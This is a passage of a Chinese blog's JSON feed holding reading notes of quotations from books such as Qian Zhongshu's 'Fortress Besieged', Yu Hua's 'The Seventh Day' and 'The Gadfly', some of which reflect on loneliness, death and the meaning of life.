3-25</h3>\n<p>误解与成见，往往会铸成比恶意和狡诈更多的过错。</p>\n<p>我强烈地渴望着把自己所感悟到的，眼睛所及的娟绣在纸上，让它成为我心灵的镜子，但是，我不能，我无法做到。我不朽的著作就刻在我的心中。</p>\n<p>我现在最需要的是安静的生活、是一种没有任何烦扰的生活，我已经厌倦了无休止的指责、鼓励，我一向喜怒无常，情绪变换莫测，常常在欢愉的时刻一下子变得犹豫起来。</p>\n<p>一个人如果总是想戏虐和疏远下等人来保持尊严，他就是最可耻的。</p>\n<p>这里还有一些很虚伪的人，他们一见到你就异乎寻常的热情，真叫人受不了。</p>\n<p>所有人都在毫无目的的活着，他们地一切活动，都只是为了生存，在饼与蛋糕的支配下，他们麻木的干着事情，没有思想没有信念。我找不到另外一个充满情趣的世界，只能生活在现实的如梦的生活中。</p>\n<h3 id=\"3-26\"><a class=\"markdownIt-Anchor\" href=\"#3-26\">#</a> 3-26</h3>\n<p>在内心为自己创造一个世界，在那个世界中体味到生活的乐趣，不受任何限制，只要他愿意，就能随时离开现实中的这座监狱，走进他的乐园。</p>\n<p>我可以在心里把她勾勒成世间最美的女子，又何必与现实中的人相对照。</p>\n<p>世界上常有一类人，常常喜欢怨天尤人，抱怨生活的苦闷，可是快乐需要我们去发现去创造呀，因为我们有能力制造快乐，所以才更有能力承担痛苦。</p>\n<p>人心的虚妄是多么可悲呀，明明知道不可能，却一味的一叶障目，不肯面对真相，这样的人无非想自我安慰，寻求个心安理得罢了。</p>\n<p>难道现在的我就无所作为吗？世间的一切，在我眼中都是无聊的，只有傻瓜才为了别人的意愿去追名逐利、碌碌无为。</p>\n<p>病痛在耗尽人精力的同时，也摧毁了他自我解脱的意志和勇气。</p>\n<p>我对自己一步步走到眼前的尴尬境地，一直看得清清楚楚，甚至包括现在，但就是不思悔改，仍然一意孤行，多么荒唐。</p>\n<p>有些行为，无论动机如何，都是罪过。</p>\n<p>自杀是软弱无能的表现，与坚韧地忍受痛苦的人生相比，死是最容易的事。</p>\n<p>在激情澎湃时，就会受到人性的局限，理智不会在任何时候，任何情况下都发挥作用。对一个极力想自杀的人说以安慰的话，就跟向一个得了癌症病人等等再死，会被治疗的，本质一样。</p>\n<p>人们总乐于接受第一个印象，它一旦在头脑中形成，就变得根深蒂固，不容更改。人生亦如此，即使是最荒诞离奇的事，一旦被信以为真，就无法再推翻。</p>\n<p>幸福与不幸完全取决于自己，取决于我们和什么样的人比较。我这个人爱幻想，常常臆想出一些方方面面都优越于我的人，这是我痛苦不快的根源。</p>\n<p>那赤裸裸的欲望，即低下、又可悲。</p>\n<h3 id=\"3-27\"><a class=\"markdownIt-Anchor\" href=\"#3-27\">#</a> 3-27</h3>\n<p>在这个社会上，等级差别有其存在的合理性和必要性，我也完全没有理由去管这些闲事，可是它无法按自己的意愿行事，眼中破坏着我的幸福。</p>\n<p>我像小丑一样在人前跳来跳去，像木偶一样被人玩弄。我所有的行动都不受自己的大脑支配，从前的饱满热情都逃匿的无影无踪。</p>\n<p>读读书、看看报、甚至到山上观赏落日，都要强于那些虚伪的应酬。</p>\n<p>如今，我又从广大的世界回到这里，有的只是悲伤和理想的破灭。</p>\n<p>我这个有教养的人，确切的说，是被教养成一塌糊涂的人。</p>\n<p>而我呢？我一无所有。我毫无目的的从家里跑出来，眼下又毫无希望的回来，连那可怜人所拥有的一丝快乐都不曾有。</p>\n<p>这一切的一切都让他觉得自己愚蠢至极。连赖以平平庸庸生活下去的本领都没有。结果，他遗失了自己所有的斗志，他所能做的，除了放任自己的阴霾情绪以外，就是把全部的思想和经历耗费在另一种东西上，他在这个自己编织的网中苦苦挣扎，一步步走向死亡。</p>\n<p>过去曾有的幸福，是我生活中的唯一慰藉，我像一个风烛残年的老人一样，苟延残喘的活着，随时等待着死神的召唤。</p>\n<p>因为我彻底看清了，生活在你身边除了给你带来不快乐，毫无意义。</p>\n<p>周围万籁无声，我的内心也像水一样平静。</p>\n",
            "tags": [
                "人生",
                "成长"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/21%E3%80%8A%E5%9B%B4%E5%9F%8E%E3%80%8B%E9%92%B1%E9%92%9F%E4%B9%A6/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/21%E3%80%8A%E5%9B%B4%E5%9F%8E%E3%80%8B%E9%92%B1%E9%92%9F%E4%B9%A6/",
            "title": "《围城》钱钟书",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>天下就没有偶然，那不过是化了妆，戴了面具的必然。</p>\n<h3 id=\"3-31\"><a class=\"markdownIt-Anchor\" href=\"#3-31\">#</a> 3-31</h3>\n<p>这一张文凭，仿佛有亚当、夏娃下身那片树叶的功能，可以遮羞包丑；小小一方纸能把一个人的空疏、寡陋、愚笨都掩盖起来。自己没有文凭，好像精神上赤条条的，没有包裹。</p>\n<p>医学要人活，救人的肉体；宗教救人的是灵魂，要人不怕死。所以病人怕死，就得请大夫，吃药；医药无效，逃不了一死，就找牧师和神父来送终。学医而兼信教，那等于说：“假如我不能教病人好好的活，至少我还能教他好好的死，反正他请我不会错”。</p>\n<p>她不是变心，因为她没有心；只能算日子久了，肉会变味。反正自己并没有吃亏，也许还占了便宜，没得什么抱怨。方鸿渐把这种巧妙的词句和精密的计算来抚慰自己，可是失望、遭欺骗的情欲、被损伤的骄傲，都不肯平伏，像不倒翁，捺下去又竖起来，反而摇摆得厉害。</p>\n<p>理想中的留学回国，好像地面的水，化气升上上空，又变雨回到地面，一世的人望着、说着。现在万里回乡，祖国的人海里，泡沫也没起一个。</p>\n<p>感觉出国这四年光阴，对家上好像荷叶上泻过的水，留不下一点痕迹。回来所碰见的还是四年前的那些人，那些人还是做四年前所做的事，说四年前所说的话，甚至认识的人里面一个都没死掉。</p>\n<h3 id=\"3-32\"><a class=\"markdownIt-Anchor\" href=\"#3-32\">#</a> 3-32</h3>\n<p>从我们干实际工作的人的眼光看来，学哲学跟什么都不学完全没两样。</p>\n<p>空气里蠕动着她该说的情话，都铺凑向他嘴边要他说。他不愿意说，而又不容易静默。女孩子的脸假的很老实，因为绝没有人会相信贴在她脸上的那张脂粉博饼会是她的本来面目。</p>\n<p>也许赵先生认为她应该头上长两只牛角，那就是一望而知的是什么人了。否则，外表上无论如何看不出来的。</p>\n<p>结婚仿佛金漆的鸟笼，笼子外面的鸟想住进来，笼内的鸟想飞出来；所以结而离，离而结，没有了局。</p>\n<p>方先生的过去太丰富了！我爱的人，我要能够占领他整个生命，他在碰见我以前，没有过去，留着空白等待我。</p>\n<p>天天碰见的人，都跟往常一样，丝毫没变，对自己伤心丢脸这种大事全不理会似的。</p>\n<p>他个人的天地忽然从世上公共生活的天地里分出来，宛如与活人幽明隔绝的孤独，瞧着阳世的乐事，自己插不进去，瞧着阳世的太阳，自己晒不到。</p>\n<p>信口胡扯，而偏能一语道破，天下未卜先知的预言家都是这样的。</p>\n<p>家里粗茶淡饭的苦生活，你也应该过过；年轻人就贪于舒服，骨头松了，一世没有出息。</p>\n<p>同行最不宜结婚，因为彼此是行家，谁也哄不到谁，丈夫不会高深莫测的崇拜太太，太太也不会盲目的崇拜丈夫，婚姻的基础就不牢固。</p>\n<p>狗为了追求水里头肉骨头的影子，丧失了到嘴的骨头，跟爱人如愿以偿结了婚，恐怕那时候肉骨头下肚，倒要对水怜惜这不可见的影子了。</p>\n<p>今天的苦算吃完了，明天得苦还远的很，这一切的身心安适是向不属今明两天的中立时间的躲避。</p>\n<p>我发现拍马屁跟谈恋爱一样，不容许有第三者冷眼旁观。咱们以后恭维起来人时，得小心旁边有没有其他的人。</p>\n<p>旅行是最劳顿、最麻烦、叫人本相毕现的时候。经过长期苦旅行而彼此不讨厌的人，才可以结交朋友。</p>\n<h3 id=\"3-33\"><a class=\"markdownIt-Anchor\" href=\"#3-33\">#</a> 3-33</h3>\n<p>天下就没有偶然，那不过是化了妆，戴了面具的必然。</p>\n<p>年轻的时候，我们总是会将自己的创作冲动误解为创作才能。</p>\n<p>把忍受当成享受，是精神对于物质的最大胜利，灵魂可以自主，也可以自欺。</p>\n<p>结婚无需太伟大的爱情，彼此不讨厌已经够结婚资本了。</p>\n<p>爱情多半是不成功的，要么苦于终成眷属的厌倦，要么苦于未能终成眷属的悲哀。</p>\n<p>结婚仿佛被围困的城堡，城外的人想冲出去，城里的人想逃出来。</p>\n<p>蛋已经下了，就不要问母鸡是怎样下的。</p>\n<p>我们彼此来往也如此，相知不深的陌生人。</p>\n<p>得学位是为了把论文哄过自己的先生；教书是把讲义哄过自己的学生。</p>\n<p>有几个死掉的自己，埋葬在记忆里，立碑之墓，偶一凭吊。</p>\n<p>这地方，好好地一个人来了，也会变成牲畜。</p>\n<p>一个人身心畅适，精力充沛，会不把顽强的事实放在眼里，觉得有本领跟现状开玩笑。真到忧患穷困的时候，人穷智短，谎话是说不好的。</p>\n<p>天生人是教他们孤独的，一个个该各归各，老死不相往来。身体里容不下的东西，或消化，或排泄，是个人的事，为什么心里容不下的感情，要找同伴来分摊？聚在一起，动不动自己冒犯人，或者人开罪自己，好像一只只刺猬，只好保持着彼此间的距离，要亲密团结，不是你刺痛我的痛，就是我擦破你的皮。</p>\n",
            "tags": [
                "人生",
                "爱情"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/24%E3%80%8A%E7%AC%AC%E4%B8%83%E5%A4%A9%E3%80%8B%E4%BD%99%E5%8D%8E/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/24%E3%80%8A%E7%AC%AC%E4%B8%83%E5%A4%A9%E3%80%8B%E4%BD%99%E5%8D%8E/",
            "title": "《第七天》余华",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>她抱怨过一次又一次，然后一次又一次地忘记了抱怨，开始憧憬新的。</p>\n<h3 id=\"3-45\"><a class=\"markdownIt-Anchor\" href=\"#3-45\">#</a> 3-45</h3>\n<p>我行走在若隐若现的城市里，思绪在纵横交错的记忆路上寻找方向。我思纣应该找到生前最后的情景。这个最后的情景应该在记忆之路的尽头，找到了它也就是找到了自己的死亡时刻。</p>\n<p>这一天，似乎是昨天，似乎是前天，似乎是今天。可以确定的是，这是我再那个世界的最后一天。</p>\n<p>他们说的话，我连标点符号都不信。</p>\n<p>我来到了记忆之路的尽头，不管如何努力回想，在此之后没有任何情景，蛛丝马迹也没有。</p>\n<p>呼唤仿佛飞跃很远的路途，来到我这里时被拉长了，然后像叹息一样掉落下去，我环顾四周，分辨不清呼唤来自哪个方向，只是感到呼唤折断以的一截一截飞越而来。</p>\n<h3 id=\"3-46\"><a class=\"markdownIt-Anchor\" href=\"#3-46\">#</a> 3-46</h3>\n<p>我看着他低头穿过马路，消失在陌生的人流里，心里涌上一股难言的情绪。他在公司工作 5 年，可是对他来说公司里的同事与大街上的陌生人没什么区别。</p>\n<p>虽然爱情的脚步在屋前走过来又走过去，我也听到了，可是我觉得那是路过的脚步，那是去向别人的脚步。</p>\n<p>她是一个能够改变命运的人，而我只会在自己的命运里随波逐流。</p>\n<p>我知道自己和一个熟悉的女人躺在一起，可是她说话的陌生声音让我觉得是和一位素不相识的女人躺在一起。</p>\n<p>我尝试从不同的方向走过去，始终不能接近他，我好像行走在静止里，那间出租屋望不可及。</p>\n<p>我们两个相依为命度过了经历时漫长回忆时短暂的生活。</p>\n<p>我走出自己趋向繁复的记忆，如同走出层恋叠翠的森林。疲惫的思维躺下休息，身体仍然向前走，走在无边无际的混沌和无声无息的空虚里，空中没有鸟儿飞翔，水中没有没有鱼儿游曳，大地没有万物生长。</p>\n<p>我跟随她走向了未知之处。我知道了她的名字，不是她告诉我的，是我的记忆追赶上那个离去的世界。</p>\n<p>我们走在寂静里，这个寂静的名字叫做死亡。我们不再说话，那是因为我们的记忆不再前行。这是隔世记忆，斑驳陆离，虚无又真实。</p>\n<p>他们之前的仇恨没有越过生与死的边境线，仇恨被阻挡在了那个离去的世界。</p>\n<p>我们围坐在篝火旁，宽广的沉默里暗暗涌动千言万语，那是很多卑微的人生在自我诉说。每一个在那里离去的世界里，都有着不愿回首的心酸事。每一个都是那里的孤苦伶仃者。</p>\n<p>没有说话，没有动作，只有无声的相视而笑。我们坐在静默里，不是为了别的什么，只是为了感受我们不是一个，而是一群。</p>\n<p>伍超如同一个阴影游荡在城市凛栗的寒风里。他在黑夜的城市里没有目标的走着，不知自己走了多长时间，不知自己走在什么地方，就是经过鹏飞大厦也没有抬起头来看一看。他一直走到天亮，仍然没有走出自己的迷茫。</p>\n<h3 id=\"03-47\"><a class=\"markdownIt-Anchor\" href=\"#03-47\">#</a> 03-47</h3>\n<p>她抱怨过一次又一次，然后一次又一次地忘记了抱怨，开始憧憬新的。</p>\n<p>他的讲述东一句西一句，如同是在讲述梦中断断续续没头没尾的情景。</p>\n<p>很多的人，很多只剩下骨骼的人，还有一些有肉体的人，在那里走来走去。</p>\n",
            "tags": [
                "生命",
                "意义"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/23%E3%80%8A%E7%8E%B0%E5%AE%9E%E4%B8%80%E7%A7%8D%E3%80%8B%E4%BD%99%E5%8D%8E/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/23%E3%80%8A%E7%8E%B0%E5%AE%9E%E4%B8%80%E7%A7%8D%E3%80%8B%E4%BD%99%E5%8D%8E/",
            "title": "《现实一种》余华",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>在暴力和混乱面前，文明只是一个口号，秩序成了装饰。</p>\n<h3 id=\"03-45\"><a class=\"markdownIt-Anchor\" href=\"#03-45\">#</a> 03-45</h3>\n<p>他们像往常一样默不作声，仿佛什么也没发生，或者说发生的一切已经十分遥远，远得已经走出了他们的记忆。</p>\n<p>人生的真相是什么？从小辈间的无意伤害，到大人们的相互杀戮，每个人的犯罪似乎都是出于偶然或者本能，就跟游戏相同。</p>\n<p>在暴力和混乱面前，文明只是一个口号，秩序成了装饰。</p>\n<p>人性中文明的一面远远抵挡不住其野蛮与愚蠢的一面，后者略受诱惑就一触即发，而一旦引发就会像多米诺骨牌一样自动发展扩大，直到将双方都毁灭殆尽。</p>\n",
            "tags": [
                "社会",
                "人性"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/28%E3%80%8A%E5%BD%93%E5%91%BC%E5%90%B8%E5%8C%96%E4%B8%BA%E7%A9%BA%E6%B0%94%E3%80%8B%E4%BF%9D%E7%BD%97%C2%B7%E5%8D%A1%E6%8B%89%E5%B0%BC%E4%BB%80/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/28%E3%80%8A%E5%BD%93%E5%91%BC%E5%90%B8%E5%8C%96%E4%B8%BA%E7%A9%BA%E6%B0%94%E3%80%8B%E4%BF%9D%E7%BD%97%C2%B7%E5%8D%A1%E6%8B%89%E5%B0%BC%E4%BB%80/",
            "title": "《当呼吸化为空气》保罗·卡拉尼什",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>她生气，是因为我向她许诺的生活是一回事，给她的，又是另一回事。</p>\n<h3 id=\"3-68\"><a class=\"markdownIt-Anchor\" href=\"#3-68\">#</a> 3-68</h3>\n<p>他明知不可为而为之，为的只是他的尊严，也就是人类共有的尊严，也就是生存的意义。</p>\n<p>别因为你要死了才会去做或者不去做某些事情，而是要找到自己认为重要的事情，不管什么时候，只要去做。</p>\n<p>他只是自始至终为自己所追寻的生命意义与价值而认真地活着而已。</p>\n<p>既然忠于自己的生命意义，也就没什么好害怕的了，只要义无反顾地往前走就好。何况生命本就充满变化，每个人生命的意义也时刻都在发生变化。</p>\n<p>她生气，是因为我向她许诺的生活是一回事，给她的，又是另一回事。</p>\n<p>那本让我和周围一派生机勃勃分离开来的死亡之书，变成了我自己行就将暮的身体。</p>\n<p>“医生马上就到”。于是乎，我想象中的未来，就要实现的未来，那么多年奋斗即将迎来的人生巅峰，都随这句话消失了。</p>\n<p>我学习的最大动力，不是成就感，而是一种求知欲，我非常认真地想要探究，是什么让人类的生命充满意义？</p>\n<p>生命是否有意义，某种程度上要看我们建立的关系的深度。就是人类的关联性加强了生命的意义。但这个过程存在于大脑和身体里，也受生理原因的驱使，可能被打败，可能会失败。</p>\n<h3 id=\"3-69\"><a class=\"markdownIt-Anchor\" href=\"#3-69\">#</a> 3-69</h3>\n<p>从道德的角度来讲，比起行动，思考是微不足道的。</p>\n<p>有一天我们诞生，有一天我们死去，同样的一天，同样的一秒钟…… 他们让新的生命诞生在坟墓上，光明只闪现了一刹那，跟着又是黑夜。</p>\n<p>熵总是在增大的，生命是无常的。疾病，就是分子的顺序打乱了；生命的基本要求是新陈代谢，而死亡，就是新陈代谢的终止。</p>\n<p>你唯一需要做的，就是直视我的眼睛。</p>\n<p>沉浸于空洞的形式主义，只会生搬硬套，完全忽略更大程度上的人性意义。</p>\n<p>全身贯注的工作让时针失去了意义，随便怎么走都行。</p>\n<p>我开始意识到，如此接近自己的死亡，好像什么都没改变，又好像一切都改变了。我知道自己总有一天会死，但不知是哪一天。</p>\n<p>如果死亡的沉重感不会减轻一丝一毫，那么至少能不能变得更习以为常一些呢。</p>\n<p>面对自己的死亡，我在挣扎，是重建旧生活，还是去寻找新生活。</p>\n<p>不管我走到哪里，死亡的阴影都会模糊任何行动的意义。我还记得那豁然开朗的那一刻，压倒一切的不安终于消散，似乎不可逾越的惶恐之海里终于显现出前进之路。</p>\n<p>我下了床，向前一步，一遍遍重复着完整的句子 “我无法前行，我仍然前行”。</p>\n<p>即使我是个将死之人，我仍然还活着，直到真正死去的那一刻。</p>\n<p>死亡也许只是一生一次的短暂事件，但与绝症共存则是个长期的过程。</p>\n<p>把科学作为形而上学的最终裁判标准，不仅否定了上帝在这世界上的存在，还同时否定了爱、恨与意义。如果上帝在科学中无立足之地，那么人生的意义在科学中也无法容身。</p>\n<p>无神论：古老的圣言已经灰飞烟灭，人类终于知道，自己是这冷酷无情的广阔宇宙中孤独的存在，而自己在这宇宙的诞生，也是偶然的。</p>\n<p>我们心中都有一个善的概念，但不是时时刻刻都做得到。</p>\n<h3 id=\"3-70\"><a class=\"markdownIt-Anchor\" href=\"#3-70\">#</a> 3-70</h3>\n<p>朝着终极真理挣扎向前，但发现这是不可能完成的任务；或者说，有可能找到正确答案，但证实这个答案，是绝对不可能的。</p>\n<p>我们每个人最终能看到的，都只不过是生命的局部。没有什么人能够包揽人类所有的认知。认知产生于我们所创造的，我们彼此之间的关系，以及我们与世界的关系之中，永远不可能完整全面。</p>\n<p>我所在的世界已然不同，这是个更古老的世界，人类的行动在超人类的力量面前显得苍白无力。这个世界比起莎士比亚的作品更悲剧。</p>\n<p>一天天过得千篇一律，时间似乎也静止了。对于现在的我，与其说时间是时钟的滴答作响，不如说是一种生存的状态。</p>\n<p>而现在，每天的一分一秒都变得毫无意义，每一天整体来看也好不到哪去。现在的我，完全看不到 5 年后的我在做什么。也许已经去世，也许没有。花时间去思考未来似乎没有什么用处，只要想象午饭吃什么就好了。</p>\n<p>大多数的梦想和抱负，要么被实现，要么被抛弃。无论如何，都属于过去。而我的未来已经不是一架天梯，通往逐步升高的人生目标，而是一路平坦，铺陈为永恒的现在。</p>\n",
            "tags": [
                "人生",
                "生命"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/27%E3%80%8A%E7%89%9B%E8%99%BB%E3%80%8B%E8%89%BE%E6%8D%B7%E5%B0%94%C2%B7%E4%B8%BD%E8%8E%B2%C2%B7%E4%BC%8F%E5%B0%BC%E5%A5%91/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/27%E3%80%8A%E7%89%9B%E8%99%BB%E3%80%8B%E8%89%BE%E6%8D%B7%E5%B0%94%C2%B7%E4%B8%BD%E8%8E%B2%C2%B7%E4%BC%8F%E5%B0%BC%E5%A5%91/",
            "title": "《牛虻》艾捷尔·丽莲·伏尼契",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>我一定要在我自己的路上走，跟随着我所看见的那片光明。</p>\n<h3 id=\"3-62\"><a class=\"markdownIt-Anchor\" href=\"#3-62\">#</a> 3-62</h3>\n<p>真正意义的行动时不应当考虑生命危险的，我被神派到这个城市里来，好比是马身上的一只牛虻，职责就是刺激他赶快前进。</p>\n<p>无论我仍然活着，还是我已经死去，我都是一只牛虻，愉快的飞来飞去。</p>\n<p>我一定要在我自己的路上走，跟随着我所看见的那片光明。</p>\n<h3 id=\"3-63\"><a class=\"markdownIt-Anchor\" href=\"#3-63\">#</a> 3-63</h3>\n<p>假如你对什么事有了某种感受，那他便会束缚你；假如你没这种感受，什么东西也不能束缚你。</p>\n<p>过去他模模糊糊的一直都有那么一种无法满足的感觉，并且感觉到精神匮乏，始终都在神学理论与宗教仪式的沉重的负荷下竭力压制着这种感觉。</p>\n<p>没有充分理由永远都别禁止什么东西，假如你始终都拉紧缰绳，那么最驯服的马也能踢人。</p>\n<p>他渐渐失去了对时间和地点的意识。黑暗仿佛没有了边际，既没有起始，也没有终结。对于他来说，生命好像已经中断了。</p>\n<p>没有什么可以想的，也没有什么令他费心的事。只是毁掉一个厌烦且没有用的思想，除此之外不会再有什么其他事可以做了。</p>\n<p>正是因为这些东西 ---- 这些虚假同时又带着奴性的人们，这些无知同时又没有思想的神灵 — 他受尽了侮辱、激情和失望至极的各种折磨。</p>\n<p>没有什么遗憾的，也没有什么值得怀念。这是个令人厌烦的小角落，犹如一汪死水，到处都是谎言和笨拙而低劣的骗诈，还有散发臭味的阴沟，阴沟非常浅，就连人也淹不死。</p>\n<p>无论到了什么地方，生活都是相同的，丑陋、腐朽、毒虫到处都是，充斥着令人耻笑的秘密与黑暗的角落。生活依旧是生活。</p>\n<p>是原则有了错误，并非这个人或那个人行为不当。</p>\n<p>人们习惯于将勒索、贪污与人所不齿的私人勾结视为高级教士职业的附属品，是恒定不变的。</p>\n<p>回忆不忍再去回想的往事，不仅于事无补而且更为愚蠢。那会使人的神经受到刺激，让人想象各种不真实的事情。</p>\n<p>那些笑话既不庸俗也不令人呕吐，可是平庸而又迂腐。</p>\n<p>丢人，这是一个人的堕落。我们大部分人都是堕落的，或者这个方面，或者那个。</p>\n<h3 id=\"3-64\"><a class=\"markdownIt-Anchor\" href=\"#3-64\">#</a> 3-64</h3>\n<p>一个活脱脱，奋力挣扎的灵魂，拴在那个弯曲的身体里，被迫让人把他当成奴隶使用吗？它在人们的跟前冻得瑟瑟发抖，耻辱和痛苦让他喘不过气来，感受到了鞭子一般的讽刺。</p>\n<p>我相信，在一个没有文明道德的国家可以享受自由自在的生活，这比任何一种景色更加吸引我。置身在繁忙的城市中，永远也体验不到个人的人格尊严。</p>\n<p>事情的本身并不是让我很难忘记，难以忘记的是我曾经无法控制自己。</p>\n<p>一个人的忍耐不是无限的，可是一旦人达到了这个限度，就永远也不清楚什么时候可以在达到这个限度。</p>\n<p>我想也许是人类的天性吧，他们看到我只有一只手可以还击。我终于难以忍受了，毫无目的的流浪在他方。就这么乱走，希望能出现奇迹，我就这么走啊走，一直走的快叫我发疯，还是什么都没有。</p>\n<p>我所干的东西可能没有较大的价值，可是我们都是尽自己最大的努力。</p>\n<p>我并不信任世俗的道德规则，并且我也不尊敬他们。对我而言，男人与女人之间的关系只是个人的爱好与厌烦的问题，还有一个金钱的关系。</p>\n<p>他当然承受了一个人所能承受的一切，他的心曾经被拉进烂泥里，并且遭到了路人的践踏。他心灵上所有的地方都烙上了被人轻蔑的印记，所有的地方都留下了遭人耻笑的痕迹。</p>\n<p>不要摘掉你的面具，假如它可以给你慰藉。可是为了你个人，别在你的心灵上也扣上一个面具。</p>\n<p>如果我们当中有一个人死了，另外一个人将会把这一切记住。我们将会忘掉这个喧闹而又永恒的世界，我们将会一块离开这个世界。我们将会步入死亡的秘密殿堂，躺在那些罂粟花的中央。</p>\n<p>他不敢抬起头，以免看到他知道这儿并不存在的幻影。那个幽灵连幻觉都称不上，只不过是由于过度疲劳的神经而产生的一个幻影。</p>\n<h3 id=\"3-65\"><a class=\"markdownIt-Anchor\" href=\"#3-65\">#</a> 3-65</h3>\n<p>和一个没有头脑的人争论只是自费口舌，涂伤肝火而已。</p>\n<p>对他而言，他自己的痛苦只是郁闷的机械重担，压到了某个忘记自己还有灵魂的木头物件上。实际上，结局怎么样已经没有关系了。对于一个有知觉的生物来说，唯一重要的是免除难以忍受的伤痛。至于是从外部条件开始，还是从扼杀感觉开始，那不是一个至关重要的问题。</p>\n<p>他的四肢曾经都被捆绑着，如今却可以伸展自如、转动和扭曲，煞是舒服。</p>\n<p>起码我会做好自己的事情，而且承担事情的后果。</p>\n<p>我们像两个在黑暗里迷失方向的孩子，错把对方当成幽灵。如今我们已经找寻到了对方，来到光明的世界里了。</p>\n<p>我忍受着这一切，用最大的耐心支撑着我的心灵，因为我会回来，而且和您的上帝拼搏。我就是抱着这个目标，把它当成盾牌来保护我的内心，这样我才没有变疯没有再次死去。</p>\n<p>我不可能在作出让步了，我已经厌倦了让步，尝够了让步的苦头。</p>\n<p>曾在空洞的黑暗里将他累垮的幽灵般的恐惧，那个阴影世界的幻想和噩梦，随着产生这所有的一切的黑夜一扫而空了。只要太阳升起来，他的敌人就会激发他的拼搏精神。</p>\n<p>在剩下的时间里，他却毫不耐烦的行使他的职责，在旧习惯的支配结束那些对他而言已经毫无价值的礼节。他的声音很有节奏，后来成了嘟嘟囔囔的低语，像来自一个他已经不再属于的那个世界。</p>\n<p>他这一生始终都是不可非议的，如今，她离开了自己，光明是难以出现了，虽然未来如此凄凉，假如能够保持心中的平静和接着做自己的事，或者仍有意义。</p>\n<p>她带着一种蜡黄而透明的虚弱神情，仿佛一个老修女的脸庞 ----- 阴郁、孤寂，再加上长时间幽居下来的悲哀。</p>\n<p>他们归归根结底还是爱她的，用自己的那一套方式去爱她。</p>\n<h3 id=\"3-66\"><a class=\"markdownIt-Anchor\" href=\"#3-66\">#</a> 3-66</h3>\n<p>列尼习惯了尊重世俗定见，但玛格丽特反对任何形式的传统观念，不顾一切的去追求自己精神上的自由。</p>\n<p>她好像始终用一道玻璃墙将他们分开，她讳深莫测，似乎和他们形如陌路。</p>\n<p>童年时代的一些事就像芒刺一样深深地扎在心底，等长大成人了，无论怎么努力，这怎么都拔不掉了。</p>\n<p>我根本没有忘，只是自己在骗自己而已。</p>\n<p>如今你感到嫌恶所有的一切 — 这不足为奇，然而一两个月之后，他们便会有所醒悟，都会做自己的事，不会再影响你的工作了。</p>\n<p>这都习以为常了，其实也不过如此。最难受的是………… 独自一人。</p>\n<p>他究竟怎么了？难道他疯了，或者他原本就是这种废物，一个陌生的浪荡小丑怎么把他有规律的生活方式搞得颠三倒四？</p>\n<p>在他听见有人喊他名字时，他或许在等待一种打击吧。</p>\n<p>丽质的天性去模仿低贱的天性，有意识地尽量改变自己身上所有美好的东西，以讨好这些厌恶的，品德败坏的人。</p>\n<p>他小心翼翼，默不作声，不知疲倦，对什么都不动声色，仿佛一架开动起来的机器，只要没出毛病，就不停的工作。</p>\n<p>隐藏在这种坚忍精神后边的不是坚忍不拔的精神，不是自我欣赏，不是害怕折磨旁人；而是一种狂乱的胆怯，一种自己欺骗自己的怀疑。</p>\n<p>我没有精神失常，更没去自杀。当然，我随时准备着，可是一直没那么做。</p>\n<p>他企图控制自己身上的这种欲念，清除他，用沉重的工作使他奄奄一息，用疲劳的方式消磨他；难以入眠的长夜，清除它，用沉重的工作使他奄奄一息，用疲劳的方式消除他。但一切都全枉然。</p>\n<p>当轮到你时，你便会明白，你将要走什么样的路，结果又会怎样。可惜的是，他深知自己没有任何希望，自然就不用着急了。</p>\n<h3 id=\"3-67\"><a class=\"markdownIt-Anchor\" href=\"#3-67\">#</a> 3-67</h3>\n<p>甚至对最好的朋友，他也一直保持距离。他生来就是一个孤独的人。有时我甚至感觉，他谁都不需要。</p>\n<p>我只想呆在自己的角落里舒适的生活，而不呆在潮湿之处。</p>\n<p>如今很多人崇拜我 ---- 这只不过是由于我硬着头皮充当小丑，使大家快乐。而只要我返璞归真，大伙就会儿攻击我了。</p>\n<p>这道门关闭了，又加了锁。他透过钥匙孔向里面张望，他究竟在想些什么呢？</p>\n<p>全部努力都毁在了他面部的那个伤口上。他又窥视了已被淡忘的往昔，于是又浮现出了以前的幻影。顿时，他什么都不知道了，既然敌人不能杀掉他，他要自杀了。</p>\n<p>后来，灰暗的朝霞钻入脏兮兮的茅舍里，照亮了熟睡的山民那一张张阴沉沉的脸庞，于是幻境没有了，留下的是一场场像噩梦一样的白天。</p>\n<p>要是这种生活都没有吓倒你，你或许还会活很久。</p>\n<p>过去的事情？彻底过去了？那么，或许我也不用这样害怕了。</p>\n<p>我对旁人感兴趣只有两个原因：“这个人是否对我有用与我是否会害怕他”。</p>\n<p>我的生命很短暂，我既不是永恒的上帝，也不是一个顽石，我只是一个人。怎能保证我不在泥泞中跌倒或超脱于这渺茫的人世之中。在这些铁石心肠、永垂不朽的人身上，最使人难受的就是他们那冷漠、高傲的表情。</p>\n<p>我真希望看一下走在烟尘滚滚的大路上的那些头顶王冠，穿金戴银的皇帝。然而除去老妇人与洋葱，我什么都没有看到过。</p>\n<p>你一直猜疑每一个人，捉弄每一个人，不相信有人是真正爱你的。难道你的假面具要一直戴到死吗？你谁都不相信，只是因为曾经有个人出卖过你。</p>\n<p>首先要克制你那与生俱来的认为独自生活最好的性情，别将你克服肉体上的痛苦这事，当成一堵围墙，将自己包围起来。</p>\n<p>他由他们的生活当中销声匿迹了，他将走自己的路。</p>\n<h3 id=\"3-68\"><a class=\"markdownIt-Anchor\" href=\"#3-68\">#</a> 